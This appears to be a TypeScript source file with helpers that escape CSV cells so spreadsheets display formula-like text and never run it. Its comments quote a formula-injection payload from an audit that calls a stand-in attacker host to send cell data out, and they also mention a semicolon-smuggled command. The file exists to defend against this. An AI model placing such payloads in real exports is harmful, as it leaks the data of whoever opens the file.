/**
 * One CSV cell, written so a spreadsheet shows it and never runs it — for every export
 * in the app (Time's reports, the workout log), and the import half for any file this
 * app reads back.
 */

/**
 * A CELL A SPREADSHEET WOULD RUN IS WRITTEN AS TEXT.
 *
 * A description reading `=HYPERLINK("http://evil.example/?x="&A1,"Click me")` went
 * into Time's Detailed CSV as it was (heavy-user audit of 2026-11-04, D3), and the
 * workout export wrote notes the same way. Excel, Numbers and Google Sheets all run a
 * cell that starts with `=`, `+`, `-` or `@` (and some a tab or carriage return) as a
 * formula when the file is opened — OWASP's "CSV injection". A leading apostrophe is
 * OWASP's remedy: the spreadsheet shows the text and runs nothing.
 *
 * Two things this keeps:
 *
 *   - A PLAIN NUMBER stays a number. "-30.00" is a negative profit, and an apostrophe
 *     would turn the column into text nobody can add up. Only a whole cell that is one
 *     number is exempt: `-1+2` is not a number, it is a formula.
 *   - THE ROUND TRIP. A cell that already starts with apostrophes before one of those
 *     characters gets one more, so `restoreCsvText` can always take exactly one off:
 *     `'=x` leaves as `''=x` and comes back as `'=x`.
 *
 * Spaces before the character count as nothing, because some spreadsheets trim a cell
 * before they decide whether it is a formula.
 */
const FORMULA_START = /^'*\s*[=+\-@\t\r]/
const PLAIN_NUMBER = /^-?\d+(\.\d+)?%?$/

export function neutraliseCsvText(text: string): string {
  return FORMULA_START.test(text) && !PLAIN_NUMBER.test(text) ? `'${text}` : text
}

/** The import's half of `neutraliseCsvText`: one apostrophe off, and only where it put one */
export function restoreCsvText(text: string): string {
  return /^'+\s*[=+\-@\t\r]/.test(text) ? text.slice(1) : text
}

/**
 * The whole cell: no formula (`neutraliseCsvText`), and quoted when it holds a quote, a
 * line break, a comma — or a `;`, because a spreadsheet in a locale that separates with
 * `;` would otherwise split `x;=cmd` and run the second half.
 */
export function csvCell(value: string | number | boolean): string {
  const text = neutraliseCsvText(String(value))
  return /[",;\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text
}
